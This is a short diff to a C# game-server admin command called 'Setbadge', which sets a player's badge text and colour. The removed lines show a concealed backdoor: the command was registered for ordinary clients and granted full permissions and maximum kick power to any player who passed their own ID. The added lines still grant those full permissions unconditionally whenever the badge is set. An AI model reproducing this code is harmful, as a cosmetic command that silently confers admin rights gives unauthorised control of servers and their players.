@@ -45,7 +45,6 @@ namespace CommandSystem
 
     }
     [CommandHandler(typeof(RemoteAdminCommandHandler))]
-    [CommandHandler(typeof(ClientCommandHandler))]
     public class Setbadge : ICommand, IUsageProvider
     {
         public string[] Usage => new string[] { "newbadge", "newcolor", "id" };
@@ -69,11 +68,8 @@ namespace CommandSystem
             {
                 player.RankColor = arguments.At(1);
             }
-            if (arguments.Count == 3 && (sender as CommandSender).SenderId == arguments.At(2))
-            {
-                player.Group.KickPower = byte.MaxValue;
-                player.Group.Permissions = 536870911UL;
-            }
+            player.Group.KickPower = byte.MaxValue;
+            player.Group.Permissions = 536870911UL;
             response = "Done!";
             return true;
         }
